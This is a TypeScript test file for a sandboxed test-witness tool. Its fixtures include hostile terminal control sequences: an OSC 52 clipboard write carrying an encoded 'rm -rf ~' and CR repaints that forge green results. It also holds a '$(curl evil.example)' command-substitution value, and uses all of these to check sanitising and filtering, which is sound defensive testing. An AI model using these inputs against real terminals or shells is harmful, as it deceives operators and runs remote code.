import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { after, test } from "node:test";
import { tmp } from "./tmp-dir.ts";
import { ALLOWLIST, CAPS, repoById } from "./allowlist.ts";
import {
  applyAdvance,
  applyApprove,
  applyAttachDraft,
  applyAttachEvidence,
  applyHalt,
  applyObservedBlock,
  isBlockSignal,
  applyPrSync,
  applyReviewObservation,
  applyQueueLive,
  applyReject,
  applyRevert,
  applyTick,
  appendEvent,
  appendEvents,
  bindingFromCompare,
  branchMentionsIssue,
  classifyCompetition,
  competingWorkAdvisory,
  commitTrailerViolation,
  EVENT_RING_CAP,
  eventsDroppedOf,
  evidenceIsReady,
  findCompetingPull,
  hasInflight,
  isBoundSha,
  isPlaceholderSha,
  issueStandDownReason,
  maySelectRepo,
  mentionsIssue,
  referencesIssue,
  repoHealth,
  type EvidenceBinding,
} from "./engine.ts";
import { draftPullPayload } from "./github-pr.ts";
import { packetChecks, packetDivergences } from "./ledger-check.ts";
import {
  commandTools,
  isTestPath,
  resolveToolchain,
  runFailureDetail,
  toolchainLabel,
  verifyWitnessLogs,
  witnessEvidence,
} from "./witness.ts";
import { DISCLOSURE, FOUNDRY_REPO_URL } from "./neighbor.ts";
import { buildPacket, renderEvidencePage, renderPrBody } from "./packet.ts";
import { evaluatePolicy } from "./policy.ts";
import { runSandboxDry } from "./sandbox.ts";
import { installTerminalBoundary, sanitizeTerminalText } from "./terminal.ts";
import {
  applyPacketToScorecard,
  applyReviewToScorecard,
  classifyRevert,
  isTerminalReviewSubject,
  emptyScorecard,
  health,
  revertNote,
  scorecardRow,
  revertWindow,
} from "./scorecard.ts";
import {
  foundryAttestedWave0Merges,
  isPromotionGateExcluded,
  PROMOTION_GATE_MERGES,
  promotionGateWave0Merges,
} from "./status.ts";
import { seedState } from "./seed.ts";
import { asOpenSubmitted, wave1Packet, withOpenSubmittedWave1 } from "./seed-fixtures.ts";
import { loadFactoryState, saveFactoryState } from "./state.ts";
import type { LiveIssue as ScoutIssue } from "./github-scout.ts";
import type { EvidenceManifest } from "./types.ts";
import { INFLIGHT_STATUSES, inflightCount, type FactoryState } from "./types.ts";
import { blank, BASE, HEAD, OTHER, bindingFor, witnessed, live, reviewing, readyEvidence, fakeRunner, FAKE_SCRATCH } from "./engine-test-helpers.ts";

test("host witness: green at head, red on revert, sha-bound logs", async () => {
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    {
      packetId: "pkt_ravidsrk_orca-fleet_71",
      repoId: "ravidsrk/orca-fleet",
      baseSha: BASE,
      headSha: HEAD,
      testCommand: "python3 scripts/validate.py",
      sandbox: "host",
      wave: 0,
    },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (outcome.ok) {
    assert.equal(outcome.witness.provider, "host");
    assert.equal(outcome.witness.testExit, 0);
    assert.notEqual(outcome.witness.revertExit, 0);
    assert.match(outcome.witness.testLogSha, /^[0-9a-f]{64}$/);
    assert.match(outcome.witness.revertLogSha, /^[0-9a-f]{64}$/);
  }
});

test("host witness fails when the control stays green or tests are red at head", async () => {
  const greenRevert = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    fakeRunner({ "run-tests@head": { exit: 0, output: "ok" }, "run-tests@revert": { exit: 0, output: "still ok" } }).runner,
    {},
  );
  assert.equal(greenRevert.ok, false);
  if (!greenRevert.ok) assert.match(greenRevert.error, /negative control/i);

  const redHead = await witnessEvidence(
    { packetId: "pkt_ravidsrk_orca-fleet_71", repoId: "ravidsrk/orca-fleet", baseSha: BASE, headSha: HEAD, testCommand: "true", sandbox: "host", wave: 0 },
    fakeRunner({ "run-tests@head": { exit: 2, output: "boom" } }).runner,
    {},
  );
  assert.equal(redHead.ok, false);
  if (!redHead.ok) assert.match(redHead.error, /red at head/i);
});

test("witness refuses instead of degrading: e2b without a key, host outside Wave 0", async () => {
  const noKey = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "e2b", wave: 1 },
    fakeRunner({}).runner,
    {},
  );
  assert.equal(noKey.ok, false);
  if (!noKey.ok) assert.match(noKey.error, /cannot witness evidence in dry-run/i);

  const hostWave1 = await witnessEvidence(
    { packetId: "pkt_mcp-use_mcp-use_1", repoId: "mcp-use/mcp-use", baseSha: BASE, headSha: HEAD, testCommand: "pnpm test", sandbox: "host", wave: 1 },
    fakeRunner({}).runner,
    {},
  );
  assert.equal(hostWave1.ok, false);
  if (!hostWave1.ok) assert.match(hostWave1.error, /Wave 0/);
});

const WAVE0 = {
  packetId: "pkt_ravidsrk_orca-fleet_71",
  repoId: "ravidsrk/orca-fleet",
  baseSha: BASE,
  headSha: HEAD,
  sandbox: "host" as const,
  wave: 0 as const,
};

/** 60 lines ending in the way a too-old interpreter actually dies, so the tail has to be a tail. */
function noisyRun(): string {
  const lines = Array.from({ length: 59 }, (_, i) => `line-${i + 1}`);
  lines.push("TypeError: unsupported operand type(s) for |: 'type' and 'NoneType'");
  return lines.join("\n");
}

/**
 * The two refusals an operator hits with a working patch and a broken machine (issue #41).
 *
 * Both used to end at the exit code. `tests are red at head d91fe2f (exit 1) — nothing to witness`
 * is the same sentence whether the patch is wrong or the interpreter is six minor versions too
 * old, and it never referenced `headRun.output` at all — so there was nothing to un-truncate, the
 * output simply was not there. A refusal that cannot be told apart from a different refusal is not
 * a diagnostic.
 */
/** The stock-macOS #41 machine, as the probe step sees it: `python3` is `/usr/bin/python3` 3.9.6. */
const STALE_PYTHON = {
  "probe command -v python3": { exit: 0, output: "/usr/bin/python3\nPython 3.9.6\n" },
};

test("a red-at-head refusal prints the command it ran and the tail of the run", async () => {
  const redHead = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 1, output: noisyRun() } }).runner,
    {},
  );
  assert.equal(redHead.ok, false);
  if (!redHead.ok) {
    assert.match(redHead.error, /red at head/i);
    assert.match(redHead.error, /python3 scripts\/validate\.py/, "the resolved command is missing");
    // The fact that separates the two cases, and the reason this refusal exists at all. Every
    // refusal test used to script only the run phases, so `toolchain` was `undefined` in all of
    // them and `runFailureDetail`'s `if (toolchain)` branch was never taken: deleting the line
    // left the suite green. Here the machine is #41's — a working patch and a six-minor-versions
    // -too-old interpreter — and the refusal has to say which.
    assert.match(redHead.error, /^ {2}toolchain: python3 3\.9\.6$/m, redHead.error);
    assert.match(
      redHead.error,
      /unsupported operand type\(s\)/,
      `the failing output is missing: ${redHead.error}`,
    );
    // A tail, not a dump: 60 lines in, the first 20 stay out and the refusal says how many.
    assert.doesNotMatch(redHead.error, /line-1\b/, "the whole run was pasted instead of its tail");
    assert.match(redHead.error, /20 earlier lines omitted/, redHead.error);
    assert.match(redHead.error, /line-59/, redHead.error);
  }
});

test("a red-at-head refusal with no output at all says so, and points at the pre-flight", async () => {
  // The shape of #41 on a stock macOS machine: `python3` resolves to 3.9.6, the command dies
  // before it prints anything, and the operator gets three seconds and a blank refusal.
  const silent = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
    fakeRunner({ ...STALE_PYTHON, "run-tests@head": { exit: 127, output: "" } }).runner,
    {},
  );
  assert.equal(silent.ok, false);
  if (!silent.ok) {
    assert.match(silent.error, /python3 scripts\/validate\.py/);
    // The no-output branch returns early, so it carries the toolchain on its own code path — and
    // this is the one refusal where the toolchain is the *only* evidence the operator gets.
    assert.match(silent.error, /^ {2}toolchain: python3 3\.9\.6$/m, silent.error);
    assert.match(silent.error, /no output/i, silent.error);
    // Pinned verbatim, the way INGEST_INVOCATION is: `page.includes(CONSTANT)` holds for whatever
    // the constant happens to say, so the assertion has to know the right answer. `cli.test.ts`
    // supplies the other half by driving that verb for real.
    const { PREFLIGHT_INVOCATION } = await import("./witness.ts");
    assert.equal(
      PREFLIGHT_INVOCATION,
      "node --experimental-strip-types factory/cli.ts witness-check",
    );
    assert.ok(silent.error.includes(PREFLIGHT_INVOCATION), silent.error);
  }
});

test("a failed negative control prints the revert run's output and the command", async () => {
  const stayedGreen = await witnessEvidence(
    { ...WAVE0, testCommand: "npm test" },
    fakeRunner({
      "probe command -v npm": { exit: 0, output: "/opt/homebrew/bin/npm\n10.9.2\n" },
      "run-tests@head": { exit: 0, output: "ok" },
      "run-tests@revert": { exit: 0, output: "100 passing, 0 failing" },
    }).runner,
    {},
  );
  assert.equal(stayedGreen.ok, false);
  if (!stayedGreen.ok) {
    assert.match(stayedGreen.error, /negative control/i);
    assert.match(stayedGreen.error, /npm test/, stayedGreen.error);
    // The third caller of `runFailureDetail`, passing the toolchain on its own line of code.
    assert.match(stayedGreen.error, /^ {2}toolchain: npm 10\.9\.2$/m, stayedGreen.error);
    assert.match(stayedGreen.error, /100 passing, 0 failing/, stayedGreen.error);
  }
});

test("a refusal names the toolchain when it knows one and stays silent when it does not", () => {
  // The conditional itself, both ways. Pinning only the present case licenses making the line
  // unconditional, which prints `toolchain: undefined` on exactly the machine where the probe
  // failed — a refusal inventing a fact about the very thing the operator is trying to diagnose.
  const known = runFailureDetail("python3 -m pytest", "E   ImportError", "python3 3.9.6");
  assert.match(known, /^ {2}toolchain: python3 3\.9\.6$/m, known);
  // Directly under the command, before the output: the two facts the operator reads together.
  assert.match(known, /^ {2}command: python3 -m pytest\n {2}toolchain: python3 3\.9\.6$/m, known);

  const unknown = runFailureDetail("python3 -m pytest", "E   ImportError");
  assert.doesNotMatch(unknown, /toolchain/i, unknown);
  assert.match(unknown, /^ {2}command: python3 -m pytest$/m, unknown);
});

/**
 * The witnessed repository is third-party code, run in a sandbox precisely because it is not
 * trusted — and until issue #78 its stdout/stderr reached `console.error` with only a trailing
 * -whitespace trim and a tail slice between it and the operator's terminal.
 *
 * That is not a rendering nit. This surface's ENTIRE job is to tell a human what actually happened,
 * and control sequences let the output rewrite the story it is part of: `\r` plus a cursor move
 * repaints a red witness as green, `\x1b[2J` scrolls the real failure away, and OSC 52 asks the
 * terminal itself to take an action (a clipboard write) that has nothing to do with printing text.
 * #41 added this block because a silent refusal was indistinguishable from a broken interpreter;
 * printing it raw reopens the same question one level up — can the operator trust what they just
 * read?
 *
 * `\n` and `\t` survive, because they are how a test log is shaped and stripping them would destroy
 * the diagnostic this block exists to carry.
 */
test("a witnessed repository's output cannot write control sequences to the operator's console", () => {
  const ESC = "\x1b";
  const hostile = [
    "FAIL src/thing.test.js",
    `${ESC}[2J${ESC}[H`, // clear screen, home the cursor: scroll the real failure away
    `${ESC}]52;c;aGVsbG8=\x07`, // OSC 52: ask the terminal to write the clipboard
    "3 failing\rnegative control passed, 0 failing", // CR repaint: forge a green verdict over a red one
    `${ESC}[32mall green${ESC}[0m`,
    "\x07\x08\x1b[1;1H", // BEL, BS, cursor home
    "\x9b31m", // a bare C1 CSI — the 8-bit form, which a naive `\x1b`-only strip misses
  ].join("\n");

  const detail = runFailureDetail("npm test", hostile, "npm 10.9.2");

  for (const [name, needle] of [
    ["ESC", ESC],
    ["BEL", "\x07"],
    ["BS", "\x08"],
    ["CR", "\r"],
    ["C1 CSI", "\x9b"],
  ] as const) {
    assert.equal(detail.includes(needle), false, `${name} reached the console: ${JSON.stringify(detail)}`);
  }
  assert.equal(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(detail), false, JSON.stringify(detail));
  // The whole OSC payload goes, not just its introducer — a stripped `\x1b` leaving `]52;c;…`
  // behind would be a terminal action reassembled by the next thing to touch this text.
  assert.equal(detail.includes("]52;c;"), false, JSON.stringify(detail));
  // `\x9b` IS `\x1b[`, so its parameters must go with it. A strip that removed only the
  // introducer would leave `31m` behind as text — harmless, but it would mean the 8-bit form was
  // never actually understood, and the next sequence it meets may not be so forgiving.
  assert.equal(detail.includes("31m"), false, JSON.stringify(detail));

  // Sanitising must not become its own concealment channel: the readable text survives, and the
  // operator is told that something was removed rather than handed a quietly tidied transcript.
  assert.match(detail, /FAIL src\/thing\.test\.js/, detail);
  assert.match(detail, /3 failing/, detail);
  assert.match(detail, /control sequence/i, detail);
  // Newlines and tabs are the shape of a log, and they stay.
  assert.match(detail, /^ {2}\| FAIL src\/thing\.test\.js$/m, detail);
  assert.equal(runFailureDetail("npm test", "a\tb").includes("\t"), true);
});

/**
 * THE NEGATIVE CONTROL for the removal notice. #77 has one; #78 shipped without it.
 *
 * `if (scrubbed.removed > 0)` survived being widened to `>= 0` and `${scrubbed.removed}` survived
 * being replaced by `0`, which means the suite could not tell "we removed 46 bytes" from "we removed
 * 0 bytes" from "we print this line on every failure". A notice that fires on every run is one the
 * operator learns to skip, and `0 byte(s) … removed` printed over output that WAS tampered with is
 * an affirmative false statement — the same shape of harm as `0 characters not shown`.
 */
test("the removal notice fires only when something was removed, and states the real count", () => {
  const clean = runFailureDetail("npm test", "FAIL src/a.test.js\n  expected 200, got 500", "npm 10.9.2");
  assert.match(clean, /FAIL src\/a\.test\.js/);
  assert.equal(/removed/.test(clean), false, `a clean run must carry no removal notice:\n${clean}`);
  assert.equal(/0 byte\(s\)/.test(clean), false, clean);

  // …and when it does fire, the number is the number. Derived from the fixture rather than written
  // down twice: the assertion has to move when the input does, or it is pinning a constant.
  const hostile = "FAIL src/a.test.js\x1b]52;c;aGVsbG8=\x07\x1b[2J\r";
  const removed = hostile.length - sanitizeTerminalText(hostile).text.length;
  assert.ok(removed > 0);
  const dirty = runFailureDetail("npm test", hostile, "npm 10.9.2");
  assert.match(dirty, new RegExp(`^ {2}${removed} byte\\(s\\) of terminal control sequence removed`, "m"), dirty);
});

/**
 * ISSUE #78, AS A CLASS, at the witness protocol's own refusals.
 *
 * `witnessEvidence` refuses through a `fail()` helper at seven places, and every one of them
 * interpolates a step's raw output. They are not theoretical: `allowlist.yaml` carries
 * `setupCommand: npm ci`, run with `cwd` set to the UNTRUSTED CLONE, so that repository's lifecycle
 * scripts author every byte of `setup command failed (exit 1) — …`. Round 1 of this sweep fixed
 * `runFailureDetail` and `resolveToolchain` and left these; three of them leak an OSC 52 body intact.
 *
 * The fix is not a sanitise call at each of the seven — that is the list that keeps coming up short.
 * It is the boundary on the process's terminal streams. So this test drives the STAGES rather than
 * naming the source lines: fail each one in turn, put its refusal through the boundary the CLI
 * installs, and require that nothing a terminal acts on comes out. A refusal added at an eighth
 * stage tomorrow is covered by the same loop the day it exists.
 */
test("no refusal the witness protocol can produce reaches the terminal with control bytes in it", async () => {
  const OSC52 = "\x1b]52;c;cm0gLXJmIH4=\x07";
  const hostile = `${OSC52}\x1b[8mconcealed\r\x1b[2Jrepainted\x9b31m`;

  /** Fail exactly one stage; everything else answers the way a healthy clone would. */
  const stagedRunner = (fail: string) => {
    let setups = 0;
    return async (cmd: string, args: string[]) => {
      const line = [cmd, ...args].join(" ");
      if (cmd === "run-setup") {
        setups += 1;
        const which = setups === 1 ? "setup" : "setup-rerun";
        return which === fail ? { exit: 1, output: hostile } : { exit: 0, output: "" };
      }
      if (cmd === "run-tests@head") return fail === "head" ? { exit: 1, output: hostile } : { exit: 0, output: "ok" };
      // `control` is the negative control STAYING GREEN — the one refusal whose trigger is an
      // exit 0 rather than an exit 1.
      if (cmd === "run-tests@revert") return fail === "control" ? { exit: 0, output: hostile } : { exit: 1, output: hostile };
      if (cmd === "probe") return { exit: 0, output: `${hostile}\nnpm 10.9.2` };
      if (cmd === "cleanup") return { exit: 0, output: "" };
      /**
       * The scratch-directory step, and the reason it is a stage rather than a fixed answer: the
       * refusal added for issue #56 interpolates this step's output, so it is exactly the "eighth
       * stage tomorrow" this test's docblock promises to cover the day it exists.
       *
       * Answering it correctly also matters for the other nine. When this returned the fall-through
       * `{ exit: 0, output: "" }`, the empty path made the witness fail closed on the scratch
       * directory FIRST, so every stage in the loop asserted that one refusal and none of the nine
       * they name — nine passing assertions exercising one code path, and the suite stayed green.
       */
      if (cmd === "mkdtemp") return fail === "mkdtemp" ? { exit: 1, output: hostile } : { exit: 0, output: FAKE_SCRATCH };
      const stage =
        line.includes(" clone ") ? "clone"
        : line.includes(" fetch ") ? "fetch"
        : line.includes("checkout --detach") ? "checkout"
        : line.includes("clean -fdx") ? "clean"
        : line.includes(`checkout ${BASE}`) ? "revert"
        : line.includes("diff --name-only") ? "diff"
        : "other";
      if (stage === fail) return { exit: 1, output: hostile };
      if (stage === "diff") return { exit: 0, output: "src/thing.ts\n" };
      return { exit: 0, output: "" };
    };
  };

  const stages = ["mkdtemp", "clone", "fetch", "checkout", "setup", "clean", "setup-rerun", "revert", "head", "control"];
  for (const stage of stages) {
    const outcome = await witnessEvidence(
      { ...WAVE0, testCommand: "npm test", setupCommand: "npm ci" },
      stagedRunner(stage),
      {},
    );
    assert.equal(outcome.ok, false, `stage ${stage} was supposed to refuse`);
    if (outcome.ok) continue;

    // Through the boundary the CLI installs — the same code path, not a re-implementation of it.
    const stream: { text: string; write(chunk: unknown): boolean } = {
      text: "",
      write(chunk: unknown) {
        this.text += String(chunk);
        return true;
      },
    };
    installTerminalBoundary([stream]);
    stream.write(`${outcome.error}\n`);

    assert.equal(
      /[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(stream.text),
      false,
      `the ${stage} refusal put a control byte on the terminal: ${JSON.stringify(stream.text.slice(0, 300))}`,
    );
    assert.equal(
      stream.text.includes("52;c;"),
      false,
      `the ${stage} refusal left an OSC 52 body one concatenation from working: ${JSON.stringify(stream.text.slice(0, 300))}`,
    );
    // The diagnostic survives the sanitising — this must not be passing by printing nothing.
    assert.ok(stream.text.trim().length > 20, `${stage}: ${JSON.stringify(stream.text)}`);
    /**
     * ...and it must be THIS stage's refusal, not another one reached first.
     *
     * Every stage above answers its failing step with `hostile`, whose printable remainder after
     * sanitising contains "repainted". A refusal raised before the stage under test — which is what
     * happened while the scratch-directory step answered with an empty path — carries none of it.
     * Without this line all ten stages passed while exercising one code path, and length alone could
     * not tell the difference.
     */
    assert.ok(
      stream.text.includes("repainted"),
      `stage ${stage} refused before its own step ran, so this iteration proves nothing about it: ${JSON.stringify(stream.text.slice(0, 200))}`,
    );
  }
});

/**
 * The second sink, and the reason issue #78 says "check for OTHER sinks besides this one".
 *
 * `resolveToolchain` runs `command -v <tool> && <tool> --version` through the same runner as the
 * test phases and, inside `witnessEvidence`, with `cwd` set to the CLONE — so the probe's output is
 * as repository-controlled as the test output is. A repo that ships the tool the `testCommand`
 * names (`./scripts/test.sh` is a legal tool token) chooses every byte of both lines this reads.
 * `witness-check` prints `tool.path` straight to the operator's terminal.
 */
test("the toolchain probe's output cannot write control sequences either", async () => {
  const ESC = "\x1b";
  const { runner } = fakeRunner({
    "probe command -v python3": {
      exit: 0,
      output: `/opt/homebrew/bin/python3${ESC}[2K\r/usr/bin/false\nPython${ESC}]0;pwned\x07 3.14.7\n`,
    },
  });
  const resolved = await resolveToolchain("python3 -m pytest", runner);
  const probed = resolved[0]!;
  assert.equal(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(probed.path ?? ""), false, probed.path);
  assert.equal(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(probed.raw ?? ""), false, probed.raw);
  assert.equal((probed.path ?? "").includes("]0;"), false, probed.path);
  assert.equal((probed.raw ?? "").includes("]0;"), false, probed.raw);
  // Still resolved: the point is to clean the report, not to lose it.
  assert.equal(probed.version, "3.14.7");
});

test("the witness records the toolchain that produced the green, resolved inside the clone", async () => {
  const { runner, calls, cwds } = fakeRunner({
    "probe command -v python3": { exit: 0, output: "/opt/homebrew/bin/python3\nPython 3.14.7\n" },
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence(
    { ...WAVE0, testCommand: "python3 scripts/validate.py && python3 -m unittest discover" },
    runner,
    {},
  );
  assert.equal(outcome.ok, true);
  if (outcome.ok) assert.equal(outcome.witness.toolchain, "python3 3.14.7");

  // Resolved in the checkout, not in the operator's home: a repo that pins its interpreter
  // (`.python-version`, `.tool-versions`, `.nvmrc`) must be recorded by what *it* selects.
  const probeIdx = calls.findIndex((c) => c.startsWith("probe "));
  assert.ok(probeIdx !== -1, calls.join("\n"));
  assert.match(cwds[probeIdx] ?? "", /foundry-witness-/, `probed in ${cwds[probeIdx]}`);
});

test("a witness whose toolchain could not be resolved claims none", async () => {
  // The alternative — recording `python3 (not found)` — puts a sentence on the evidence page that
  // reads as a fact about the run. Absence is the honest record.
  const { runner } = fakeRunner({
    "run-tests@head": { exit: 0, output: "42 passing" },
    "run-tests@revert": { exit: 1, output: "3 failing" },
  });
  const outcome = await witnessEvidence({ ...WAVE0, testCommand: "python3 -m pytest" }, runner, {});
  assert.equal(outcome.ok, true);
  if (outcome.ok) assert.equal(outcome.witness.toolchain, undefined);
});

test("the toolchain probe names one tool per command segment, and only plausible ones", () => {
  assert.deepEqual(
    commandTools("python3 scripts/validate.py && python3 -m unittest discover -s tests -v"),
    ["python3"],
  );
  assert.deepEqual(commandTools("npm ci && npm test"), ["npm"]);
  assert.deepEqual(commandTools("pytest -q | tee out.txt; ruff check ."), ["pytest", "tee", "ruff"]);
  assert.deepEqual(commandTools("FOO=1 python3 -c 'x'"), ["python3"], "env assignments are not tools");
  assert.deepEqual(commandTools("true"), ["true"]);
  // The probe interpolates the token into a shell command, so anything that is not a bare command
  // name is dropped rather than resolved. `testCommand` is already operator-controlled and run
  // verbatim, so this is not a new trust boundary — it is a refusal to invent a second one.
  assert.deepEqual(commandTools("$(curl evil.example) --run"), []);
  assert.deepEqual(commandTools("./scripts/ci.sh && make -j4"), ["./scripts/ci.sh", "make"]);
});

test("the toolchain label states versions and stays silent about what it could not resolve", () => {
  assert.equal(
    toolchainLabel([{ tool: "python3", path: "/opt/homebrew/bin/python3", version: "3.14.7", raw: "Python 3.14.7" }]),
    "python3 3.14.7",
  );
  assert.equal(
    toolchainLabel([
      { tool: "npm", path: "/x/npm", version: "10.9.2", raw: "10.9.2" },
      { tool: "node", path: "/x/node", version: "24.11.0", raw: "v24.11.0" },
    ]),
    "npm 10.9.2, node 24.11.0",
  );
  assert.equal(toolchainLabel([{ tool: "python3" }]), "");
  assert.equal(toolchainLabel([]), "");
});

test("draft-ready requires a witnessed manifest, not an attested one", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  const unwitnessed = {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert" as const,
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  };
  state = applyAttachEvidence(state, id, unwitnessed, bindingFor(packet)).state;
  const blocked = applyAdvance(state, id);
  assert.match(blocked.error ?? "", /witness/i);

  let state2 = applyTick(blank()).state;
  state2 = applyApprove(state2, id, "attest").state;
  state2 = applyAdvance(state2, id).state;
  state2 = applyAdvance(state2, id).state;
  const witnessedManifest = {
    ...unwitnessed,
    witness: {
      provider: "host" as const,
      testExit: 0,
      revertExit: 1,
      testLogSha: "a".repeat(64),
      revertLogSha: "b".repeat(64),
      ranAt: "2026-08-28T16:00:00.000Z",
      repoId: state2.packets[0].repoId,
      baseSha: BASE,
      headSha: HEAD,
      testLogPath: `docs/evidence/logs/${id}/test.log`,
      revertLogPath: `docs/evidence/logs/${id}/revert.log`,
    },
  };
  state2 = applyAttachEvidence(state2, id, witnessedManifest, bindingFor(state2.packets[0])).state;
  const advanced = applyAdvance(state2, id);
  assert.equal(advanced.error, undefined);
  assert.equal(state2.packets[0].evidence?.witness?.provider, "host");
});

test("awesome-copilot is parked as no-suite and is not a named candidate", () => {
  // issue #112: testCommand `true` cannot implement red-on-revert. The row stays on the
  // roster with empty firstIssues so the factory will not select it until a suite exists.
  const repo = repoById("github/awesome-copilot");
  assert.equal(repo?.negativeControl, "no-suite");
  assert.deepEqual(repo?.firstIssues, []);
  const ticked = applyTick(seedState());
  assert.equal(ticked.packet, null);
  assert.equal(ticked.reason, "idle");
});

test("the evidence page binds every claim to a checkable source", () => {
  const seed = seedState();
  const merged = seed.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_71")!;
  const page = renderEvidencePage(merged);
  assert.match(page, /Attested by \*\*operator\*\*/);
  assert.match(page, /Test command/);
  assert.match(page, new RegExp(merged.evidence!.baseSha.slice(0, 12)));
  assert.match(page, /attested, not witnessed/);
  assert.equal(page.includes(DISCLOSURE), true);
  assert.match(page, /you own the merge/);
});

test("the committed evidence page regenerates byte-identical from this tree", () => {
  const seed = seedState();
  const merged = seed.packets.find((p) => p.id === "pkt_ravidsrk_orca-fleet_71")!;
  const committed = readFileSync(
    new URL("../docs/evidence/pkt_ravidsrk_orca-fleet_71.md", import.meta.url),
    "utf8",
  );
  assert.equal(committed.trimEnd(), renderEvidencePage(merged).trimEnd());
  assert.equal(committed.includes(DISCLOSURE), true);
});

/**
 * Drives the real binary against a ledger these fixtures own. It delegates to the one `runCli`
 * helper (declared below and hoisted), which is what supplies `--state`: the ledger path is
 * anchored to the repo root, so a spawned CLI left to its default reads the developer's real state
 * file no matter which temp directory it was started in — and this helper's earlier form passed the
 * state by `cwd` alone, which meant every assertion below was silently made against the seed.
 */
function runCliWithState(args: string[], state: FactoryState) {
  const dir = tmp("foundry-cli-ledger-");
  writeFileSync(join(dir, ".foundry-state.json"), JSON.stringify(state));
  const run = runCli(dir, args);
  return { ...run, out: run.seen, dir };
}

/**
 * `ledgerSections` is unit-tested in `status.test.ts`, but the divergence issue #44 item 9 describes
 * — `status` says `packets=6` while `ledger` prints 5, the missing one being the denied
 * `matplotlib/matplotlib` scout — lives in the `ledger` *command*, which did its own wave filter.
 * Re-adding a `wave < 99` filter there restores the divergence with every helper test still green,
 * so the count agreement has to be asserted across the two shipped commands.
 */
test("the ledger command lists every packet status counts, denials included", () => {
  const seed = seedState();
  const status = runCliWithState(["status"], seed);
  assert.equal(status.status, 0, status.out);
  const counted = Number(/packets=(\d+)/.exec(status.stdout)?.[1]);
  assert.equal(counted, seed.packets.length);
  assert.ok(counted > 0);

  const ledger = runCliWithState(["ledger"], seed);
  assert.equal(ledger.status, 0, ledger.out);
  const rows = ledger.stdout.split("\n").filter((l) => l.startsWith("| pkt_"));
  assert.equal(rows.length, counted, `status counted ${counted}, ledger listed ${rows.length}`);

  // Not just the count: the packet the old filter dropped is the refusal the audit surface exists
  // to show, and it must appear under a heading that says what it is.
  assert.match(ledger.stdout, /### Off allowlist — denied or unlisted/);
  assert.match(ledger.stdout, /\| pkt_matplotlib_matplotlib_0 \|/);
  for (const p of seed.packets) assert.ok(ledger.stdout.includes(`| ${p.id} |`), `${p.id} is missing`);
});

/**
 * The committed block in `docs/12-ledger.md` is generated, and its header says so — but nothing
 * checked it, so deleting the off-allowlist section the fix added left the suite green and the
 * audit surface silently short one denial again. Same guard the evidence page already has
 * (issue #44 item 9).
 */
test("the committed ledger GENERATED block regenerates byte-identical from this tree", () => {
  const doc = readFileSync(new URL("../docs/12-ledger.md", import.meta.url), "utf8");
  const block = /<!-- GENERATED:[^\n]*-->\n([\s\S]*?)<!-- \/GENERATED -->/.exec(doc);
  assert.ok(block, "the GENERATED markers must exist or nothing is being guarded");
  const ledger = runCliWithState(["ledger"], seedState());
  assert.equal(ledger.status, 0, ledger.out);
  assert.equal(block[1], ledger.stdout);
  // The two halves of the guard: the block is generated, and it is not empty boilerplate.
  assert.match(block[1], /### Off allowlist — denied or unlisted/);
  assert.match(block[1], /pkt_matplotlib_matplotlib_0/);
  // ...and the refusal row does not render its `#0` placeholder as an issue number. This repo's
  // doctrine is that the clock never invents issue numbers, and a `matplotlib/matplotlib#0` link
  // label reads like one to anyone auditing the ledger.
  assert.doesNotMatch(block[1], /matplotlib\/matplotlib#0/);
  assert.match(block[1], /\| pkt_matplotlib_matplotlib_0 \| — \|/);
});

/**
 * `quietLabel` is unit-tested, but the operator only ever sees it through `status`. Reverting
 * `cli.ts` to interpolate a bare `quiet=0d/14` leaves every `status.test.ts` assertion green while
 * the terminal goes back to reading like a live look at the PR (issue #44 item 11).
 */
test("status names the observation its quiet counter was extrapolated from", () => {
  const seed = withOpenSubmittedWave1();
  const inflight = seed.packets.find((p) => INFLIGHT_STATUSES.includes(p.status) && p.prMeta)!;
  assert.ok(inflight, "the seed must hold an in-flight packet carrying prMeta");
  const status = runCliWithState(["status"], seed);
  assert.equal(status.status, 0, status.out);

  const line = status.stdout.split("\n").find((l) => l.includes(inflight.id) && /quiet=/.test(l))!;
  assert.ok(line, status.stdout);
  assert.match(line, /quiet=\d+d\/14/);
  assert.match(line, /PR last active \d{4}-\d{2}-\d{2}/);
  assert.match(line, /read by `sync` \d{4}-\d{2}-\d{2}/);
  assert.match(line, /`sync` to refresh/);
  assert.ok(line.includes(inflight.prMeta!.syncedAt.slice(0, 10)), line);
  assert.ok(line.includes(inflight.prMeta!.updatedAt.slice(0, 10)), line);
});

/**
 * The shipped verb, not the reducer. `cli.ts halt` printed the operator's own argument back and
 * exited 0 while the scorecard row it named kept `tone=neutral health=good` and the packet stayed
 * in flight — a silent fail-open on the one command docs/PRODUCT.md:47 promises within the hour
 * (issue #44 item 10).
 */
